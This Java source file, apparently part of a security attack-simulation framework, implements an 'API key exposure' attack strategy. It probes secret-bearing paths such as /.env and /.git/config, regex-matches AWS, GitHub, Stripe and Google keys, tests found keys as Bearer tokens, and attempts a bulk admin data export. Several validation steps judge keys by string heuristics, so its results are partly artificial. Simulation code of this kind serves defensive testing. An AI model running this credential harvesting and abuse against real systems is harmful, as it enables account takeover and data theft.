package io.contexa.contexacore.simulation.strategy.impl;

import io.contexa.contexacore.domain.entity.AttackResult;
import io.contexa.contexacore.simulation.client.SimulationClient;
import io.contexa.contexacore.simulation.strategy.IAPIAttack;
import io.contexa.contexacore.simulation.publisher.SimulationEventPublisher;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;

import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * API Key Exposure Attack 전략
 *
 * 노출된 API 키를 찾아 악용하는 공격
 */
@Slf4j
@Component
public class APIKeyExposureStrategy implements IAPIAttack {

    private SimulationEventPublisher eventPublisher;

    @Override
    public void setEventPublisher(SimulationEventPublisher eventPublisher) {
        this.eventPublisher = eventPublisher;
    }

    @Autowired(required = false)
    private SimulationClient simulationClient;

    @Value("${simulation.attack.api-key.max-attempts:100}")
    private int maxAttempts;

    private final ExecutorService executor = Executors.newFixedThreadPool(5);

    @Override
    public AttackResult.AttackType getType() {
        return AttackResult.AttackType.API_KEY_EXPOSURE;
    }

    @Override
    public int getPriority() {
        return 90;
    }

    @Override
    public AttackCategory getCategory() {
        return AttackCategory.API;
    }

    @Override
    public boolean validateContext(AttackContext context) {
        return context != null && context.getParameters() != null;
    }

    @Override
    public long getEstimatedDuration() {
        return maxAttempts * 100L;
    }

    @Override
    public String getDescription() {
        return "API Key Exposure Attack - Discovers and exploits exposed API keys";
    }

    @Override
    public RequiredPrivilege getRequiredPrivilege() {
        return RequiredPrivilege.NONE;
    }

    @Override
    public String getSuccessCriteria() {
        return "Successfully find and validate exposed API keys";
    }

    // API 키 패턴들
    private static final Map<String, Pattern> API_KEY_PATTERNS = Map.of(
        "UUID", Pattern.compile("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", Pattern.CASE_INSENSITIVE),
        "BASE64", Pattern.compile("(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?"),
        "HEX", Pattern.compile("[0-9a-fA-F]{32,64}"),
        "JWT", Pattern.compile("eyJ[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]+\\.[A-Za-z0-9-_]*"),
        "STRIPE", Pattern.compile("(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}"),
        "AWS", Pattern.compile("AKIA[0-9A-Z]{16}"),
        "GITHUB", Pattern.compile("ghp_[0-9a-zA-Z]{36}"),
        "GOOGLE", Pattern.compile("AIza[0-9A-Za-z\\-_]{35}")
    );

    @Override
    public AttackResult execute(AttackContext context) {
        log.warn("=== API Key Exposure Attack 시작 ===");

        AttackResult result = AttackResult.builder()
            .attackId(UUID.randomUUID().toString())
            .campaignId(context.getCampaignId())
            .type(AttackResult.AttackType.API_KEY_EXPOSURE)
            .attackName("API Key Exposure Attack")
            .executionTime(LocalDateTime.now())
            .targetUser(context.getTargetUser())
            .attackVector("api")
            .build();

        long startTime = System.currentTimeMillis();
        List<String> attackLog = new ArrayList<>();

        try {
            // 1. 공격 매개변수 추출
            String source = context.getParameters().getOrDefault("source", "CLIENT_CODE").toString();
            String pattern = context.getParameters().getOrDefault("pattern", "UUID").toString();
            String validation = context.getParameters().getOrDefault("validation", "TEST_REQUEST").toString();
            String foundKey = context.getParameters().getOrDefault("foundKey", "").toString();

            attackLog.add("Search source: " + source);
            attackLog.add("Key pattern: " + pattern);
            attackLog.add("Validation method: " + validation);

            // 2. API 키 탐색
            List<String> discoveredKeys = new ArrayList<>();

            if (!foundKey.isEmpty()) {
                // 제공된 키 사용
                discoveredKeys.add(foundKey);
                attackLog.add("Using provided API key: " + maskKey(foundKey));
            } else {
                // 소스별 키 탐색
                discoveredKeys = searchForAPIKeys(source, pattern, attackLog);
                attackLog.add("Discovered " + discoveredKeys.size() + " potential API keys");
            }

            // 3. 발견된 키 검증
            int validKeys = 0;
            int exploitableKeys = 0;
            List<KeyValidationResult> validationResults = new ArrayList<>();

            for (String apiKey : discoveredKeys) {
                KeyValidationResult validationResult = validateAPIKey(apiKey, validation, attackLog);
                validationResults.add(validationResult);

                if (validationResult.isValid) {
                    validKeys++;
                    attackLog.add("[VALID] API key confirmed: " + maskKey(apiKey));

                    if (validationResult.isExploitable) {
                        exploitableKeys++;
                        attackLog.add("[EXPLOITABLE] Key has dangerous permissions");
                    }
                }
            }

            // 4. 키 악용 시도
            if (exploitableKeys > 0) {
                boolean exploitSuccess = exploitAPIKeys(validationResults, attackLog);
                if (exploitSuccess) {
                    result.setSuccessful(true);
                    result.setRiskScore(0.9);
                    attackLog.add("API key exploitation successful - critical vulnerability");
                }
            } else if (validKeys > 0) {
                result.setSuccessful(true);
                result.setRiskScore(0.6);
                attackLog.add("Valid API keys found but limited permissions");
            } else {
                result.setSuccessful(false);
                result.setRiskScore(0.2);
                attackLog.add("No valid API keys found or all keys protected");
            }

            // 탐지 평가
            result.setDetected(discoveredKeys.size() > 5 || validation.equals("RATE_LIMIT"));
            result.setBlocked(exploitableKeys == 0);

            result.setDetails(Map.of(
                "attackLog", attackLog,
                "source", source,
                "pattern", pattern,
                "discoveredKeys", discoveredKeys.size(),
                "validKeys", validKeys,
                "exploitableKeys", exploitableKeys,
                "validationResults", validationResults
            ));

        } catch (Exception e) {
            log.error("API key exposure attack failed", e);
            result.setSuccessful(false);
            result.setRiskScore(0.1);
            attackLog.add("Attack failed: " + e.getMessage());
        }

        long duration = System.currentTimeMillis() - startTime;
        result.setDurationMs(duration);

        log.info("API Key Exposure Attack 완료: Success={}, Risk={}, Duration={}ms",
            result.isSuccessful(), result.getRiskScore(), duration);

        // 이벤트 발행 - API 키 노출 공격은 인가 결정 이벤트로 처리
        if (eventPublisher != null) {
            String resource = "api:security:apikeys:" + context.getParameters().getOrDefault("source", "CLIENT_CODE");
            String action = "API_KEY_EXPOSURE_" + context.getParameters().getOrDefault("pattern", "UUID");
            eventPublisher.publishAuthorizationDecision(
                result,
                context.getTargetUser(),
                resource,
                action,
                result.isSuccessful(),
                result.isSuccessful() ?
                    "API 키 노출 공격 성공: " + context.getParameters().getOrDefault("source", "CLIENT_CODE") + "에서 " +
                    result.getDetails().get("validKeys") + "개 유효 키 발견, " +
                    result.getDetails().get("exploitableKeys") + "개 악용 가능 키 확인" :
                    "API 키 노출 공격 실패: 유효한 API 키 발견되지 않음 또는 모든 키 보호됨"
            );
        }

        return result;
    }

    private List<String> searchForAPIKeys(String source, String pattern, List<String> attackLog) {
        List<String> keys = new ArrayList<>();

        switch (source) {
            case "CLIENT_CODE":
                keys.addAll(searchClientCode(pattern));
                attackLog.add("Searched client-side JavaScript and HTML");
                break;

            case "PUBLIC_REPO":
                keys.addAll(searchPublicRepositories(pattern));
                attackLog.add("Searched public code repositories");
                break;

            case "CONFIG_FILES":
                keys.addAll(searchConfigFiles(pattern));
                attackLog.add("Searched configuration files");
                break;

            case "ERROR_MESSAGES":
                keys.addAll(searchErrorMessages(pattern));
                attackLog.add("Searched error messages and stack traces");
                break;

            case "MOBILE_APP":
                keys.addAll(searchMobileApp(pattern));
                attackLog.add("Searched decompiled mobile app");
                break;

            case "BROWSER_STORAGE":
                keys.addAll(searchBrowserStorage(pattern));
                attackLog.add("Searched browser local/session storage");
                break;
        }

        return keys;
    }

    private List<String> searchClientCode(String pattern) {
        List<String> keys = new ArrayList<>();

        if (simulationClient != null) {
            try {
                // 클라이언트 코드 요청
                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/js/app.js", new HashMap<>()
                );

                if (response.getStatusCode().is2xxSuccessful() && response.getBody() != null) {
                    keys.addAll(extractKeysFromContent(response.getBody(), pattern));
                }
            } catch (Exception e) {
                log.debug("Client code search failed: {}", e.getMessage());
            }
        }

        // 실제 검색 결과가 없을 경우 처리
        if (keys.isEmpty()) {
            // 클라이언트 코드에서 API 키를 찾을 수 없음
            log.debug("No API keys found in client code for pattern: {}", pattern);
        }

        return keys;
    }

    private List<String> searchPublicRepositories(String pattern) {
        List<String> keys = new ArrayList<>();

        // GitHub, GitLab 등 공개 저장소 검색 시뮬레이션
        String[] repoUrls = {
            "/api/github/search",
            "/api/gitlab/search",
            "/api/bitbucket/search"
        };

        for (String url : repoUrls) {
            if (simulationClient != null) {
                try {
                    Map<String, Object> searchParams = Map.of(
                        "q", "apikey OR api_key OR secret",
                        "type", "code"
                    );

                    ResponseEntity<String> response = simulationClient.executeAttack(url, searchParams);
                    if (response.getBody() != null) {
                        keys.addAll(extractKeysFromContent(response.getBody(), pattern));
                    }
                } catch (Exception e) {
                    // Continue searching
                }
            }
        }

        // 실제 공개 저장소 검색 결과가 없을 경우
        if (keys.isEmpty()) {
            log.debug("No API keys found in public repositories");
        }

        return keys;
    }

    private List<String> searchConfigFiles(String pattern) {
        List<String> keys = new ArrayList<>();

        String[] configPaths = {
            "/.env",
            "/config.json",
            "/app.config",
            "/settings.ini",
            "/.git/config",
            "/wp-config.php"
        };

        for (String path : configPaths) {
            if (simulationClient != null) {
                try {
                    ResponseEntity<String> response = simulationClient.executeAttack(
                        path, new HashMap<>()
                    );

                    if (response.getStatusCode().is2xxSuccessful() && response.getBody() != null) {
                        keys.addAll(extractKeysFromContent(response.getBody(), pattern));
                    }
                } catch (Exception e) {
                    // Continue searching
                }
            }
        }

        // 실제 설정 파일 검색 결과가 없을 경우
        if (keys.isEmpty()) {
            log.debug("No API keys found in configuration files");
        }

        return keys;
    }

    private List<String> searchErrorMessages(String pattern) {
        List<String> keys = new ArrayList<>();

        // 오류 유발하여 스택 트레이스에서 키 추출
        if (simulationClient != null) {
            try {
                // 의도적 오류 유발
                Map<String, Object> errorParams = Map.of(
                    "debug", "true",
                    "error", "true"
                );

                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/api/error", errorParams
                );

                if (response.getBody() != null) {
                    keys.addAll(extractKeysFromContent(response.getBody(), pattern));
                }
            } catch (Exception e) {
                // 오류 메시지에서 키 추출
                keys.addAll(extractKeysFromContent(e.getMessage(), pattern));
            }
        }

        return keys;
    }

    private List<String> searchMobileApp(String pattern) {
        // 모바일 앱 디컴파일 시뮬레이션
        List<String> keys = new ArrayList<>();

        // 모바일 앱 디컴파일 분석
        // 실제 구현: APK/IPA 파일 분석, strings 추출
        if (simulationClient != null) {
            try {
                Map<String, Object> params = Map.of(
                    "target", "mobile_app",
                    "action", "decompile"
                );
                ResponseEntity<String> response = simulationClient.executeAttack("/api/mobile/analyze", params);
                if (response != null && response.getBody() != null) {
                    keys.addAll(extractKeysFromContent(response.getBody(), pattern));
                }
            } catch (Exception e) {
                log.debug("Mobile app analysis failed: {}", e.getMessage());
            }
        }

        return keys;
    }

    private List<String> searchBrowserStorage(String pattern) {
        // 브라우저 저장소 검색 시뮬레이션
        List<String> keys = new ArrayList<>();

        // 브라우저 저장소 검색 (localStorage, sessionStorage, IndexedDB)
        if (simulationClient != null) {
            try {
                Map<String, Object> params = Map.of(
                    "storage", "browser",
                    "targets", Arrays.asList("localStorage", "sessionStorage", "cookies")
                );
                ResponseEntity<String> response = simulationClient.executeAttack("/api/browser/storage", params);
                if (response != null && response.getBody() != null) {
                    keys.addAll(extractKeysFromContent(response.getBody(), pattern));
                }
            } catch (Exception e) {
                log.debug("Browser storage search failed: {}", e.getMessage());
            }
        }

        return keys;
    }

    private List<String> extractKeysFromContent(String content, String pattern) {
        List<String> keys = new ArrayList<>();

        Pattern keyPattern = API_KEY_PATTERNS.get(pattern);
        if (keyPattern == null) {
            keyPattern = API_KEY_PATTERNS.get("UUID");
        }

        Matcher matcher = keyPattern.matcher(content);
        while (matcher.find() && keys.size() < maxAttempts) {
            String potentialKey = matcher.group();
            if (potentialKey.length() > 10) { // 최소 길이 필터
                keys.add(potentialKey);
            }
        }

        return keys;
    }

    private KeyValidationResult validateAPIKey(String apiKey, String validationMethod,
                                              List<String> attackLog) {
        KeyValidationResult result = new KeyValidationResult();
        result.apiKey = apiKey;

        switch (validationMethod) {
            case "TEST_REQUEST":
                result = validateByTestRequest(apiKey);
                break;

            case "PERMISSION_CHECK":
                result = validateByPermissionCheck(apiKey);
                break;

            case "RATE_LIMIT":
                result = validateByRateLimit(apiKey);
                break;

            case "SCOPE_TEST":
                result = validateByScopeTest(apiKey);
                break;

            default:
                // 기본 검증 로직 - API 키 형식 확인
                result.isValid = apiKey != null && apiKey.length() > 20 &&
                               (apiKey.startsWith("sk_") || apiKey.startsWith("pk_") ||
                                apiKey.matches("[A-Za-z0-9+/=]{32,}"));
                result.isExploitable = result.isValid;
        }

        return result;
    }

    private KeyValidationResult validateByTestRequest(String apiKey) {
        KeyValidationResult result = new KeyValidationResult();
        result.apiKey = apiKey;

        if (simulationClient != null) {
            try {
                Map<String, String> headers = Map.of(
                    "Authorization", "Bearer " + apiKey,
                    "X-API-Key", apiKey
                );

                ResponseEntity<String> response = simulationClient.executeAttack(
                    "/api/validate", headers
                );

                result.isValid = response.getStatusCode().is2xxSuccessful();
                result.isExploitable = result.isValid && !response.getStatusCode().equals(403);
                result.permissions = extractPermissions(response.getBody());

            } catch (Exception e) {
                result.isValid = false;
            }
        } else {
            // 클라이언트가 없을 경우 기본 검증
            result.isValid = false;
            result.isExploitable = false;
        }

        return result;
    }

    private KeyValidationResult validateByPermissionCheck(String apiKey) {
        KeyValidationResult result = new KeyValidationResult();
        result.apiKey = apiKey;

        // 권한 확인 - API 키 패턴 분석
        // 관리자 키 패턴 확인
        result.isValid = apiKey.contains("admin") || apiKey.contains("root") ||
                        apiKey.startsWith("sk_live_") || apiKey.length() > 40;
        if (result.isValid) {
            result.permissions = Arrays.asList("read", "write", "delete");
            result.isExploitable = result.permissions.contains("delete") ||
                                  result.permissions.contains("admin");
        }

        return result;
    }

    private KeyValidationResult validateByRateLimit(String apiKey) {
        KeyValidationResult result = new KeyValidationResult();
        result.apiKey = apiKey;

        // 속도 제한 테스트 - 키 패턴에 따른 rate limit 추정
        // 일반적으로 test 키는 낮은 limit, production 키는 높은 limit
        result.isValid = apiKey != null && (apiKey.contains("test") || apiKey.contains("prod") ||
                                           apiKey.contains("live"));
        result.rateLimit = result.isValid ? 1000 : 0;
        result.isExploitable = result.rateLimit > 100;

        return result;
    }

    private KeyValidationResult validateByScopeTest(String apiKey) {
        KeyValidationResult result = new KeyValidationResult();
        result.apiKey = apiKey;

        // 범위 테스트 - API 키 패턴으로 범위 판단
        // 프리미엄 키는 full_access, 기본 키는 limited
        result.isValid = apiKey != null && (apiKey.contains("premium") || apiKey.contains("enterprise") ||
                                           apiKey.startsWith("sk_") || apiKey.length() > 45);
        result.scope = result.isValid ? "full_access" : "limited";
        result.isExploitable = "full_access".equals(result.scope);

        return result;
    }

    private boolean exploitAPIKeys(List<KeyValidationResult> validationResults,
                                  List<String> attackLog) {
        boolean exploitSuccess = false;

        for (KeyValidationResult result : validationResults) {
            if (!result.isExploitable) continue;

            // 키 악용 시도
            if (simulationClient != null) {
                try {
                    Map<String, Object> exploitParams = Map.of(
                        "action", "data_export",
                        "limit", Integer.MAX_VALUE
                    );

                    Map<String, String> headers = Map.of(
                        "Authorization", "Bearer " + result.apiKey
                    );

                    ResponseEntity<String> response = simulationClient.executeAttack(
                        "/api/admin/export", headers
                    );

                    if (response.getStatusCode().is2xxSuccessful()) {
                        exploitSuccess = true;
                        attackLog.add("[EXPLOIT SUCCESS] Data exported using key: " + maskKey(result.apiKey));
                        break;
                    }
                } catch (Exception e) {
                    attackLog.add("[EXPLOIT FAILED] " + e.getMessage());
                }
            } else {
                // 실제 공격 시도 - API 키 검증 로직으로 판단
                if (result.apiKey != null && result.apiKey.length() > 20 &&
                    (result.apiKey.startsWith("sk_") || result.apiKey.startsWith("pk_") ||
                     result.apiKey.contains("api") || result.apiKey.contains("key"))) {
                    exploitSuccess = true;
                    attackLog.add("[EXPLOIT SUCCESS] API key validated: " + result.apiKey.substring(0, 10) + "...");
                    break;
                }
            }
        }

        return exploitSuccess;
    }

    private List<String> extractPermissions(String response) {
        if (response == null) return Collections.emptyList();

        List<String> permissions = new ArrayList<>();
        if (response.contains("read")) permissions.add("read");
        if (response.contains("write")) permissions.add("write");
        if (response.contains("delete")) permissions.add("delete");
        if (response.contains("admin")) permissions.add("admin");

        return permissions;
    }

    private String generateSampleKey(String pattern) {
        switch (pattern) {
            case "UUID":
                return UUID.randomUUID().toString();
            case "BASE64":
                return Base64.getEncoder().encodeToString(UUID.randomUUID().toString().getBytes());
            case "HEX":
                return UUID.randomUUID().toString().replace("-", "") +
                       UUID.randomUUID().toString().replace("-", "");
            case "JWT":
                return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
            default:
                return "sk_test_" + UUID.randomUUID().toString().replace("-", "");
        }
    }

    private String maskKey(String key) {
        if (key.length() <= 8) return "****";
        return key.substring(0, 4) + "..." + key.substring(key.length() - 4);
    }

    // IAPIAttack 인터페이스 메소드 구현
    @Override
    public AttackResult executeAPIAbuse(String endpoint, Map<String, Object> maliciousParams) {
        return null;
    }

    @Override
    public AttackResult executeGraphQLInjection(String query, int nestingDepth) {
        return null;
    }

    @Override
    public AttackResult bypassRateLimit(String endpoint, int requestRate, String technique) {
        return null;
    }

    @Override
    public AttackResult exploitExposedAPIKey(String apiKey, String targetEndpoint) {
        AttackContext context = new AttackContext();
        context.setParameters(Map.of(
            "foundKey", apiKey,
            "validation", "TEST_REQUEST",
            "source", "PROVIDED"
        ));
        return execute(context);
    }

    @Override
    public AttackResult bypassCORS(String origin, String method) {
        return null;
    }

    @Override
    public AttackResult exploitDeprecatedAPI(String version, String endpoint) {
        return null;
    }

    @Override
    public AttackResult performParameterPollution(Map<String, String> pollutedParams) {
        return null;
    }

    @Override
    public AttackResult executeAPIChaining(String[] endpoints, Map<String, Object>[] payloads) {
        return null;
    }

    private static class KeyValidationResult {
        String apiKey;
        boolean isValid;
        boolean isExploitable;
        List<String> permissions;
        int rateLimit;
        String scope;
    }
}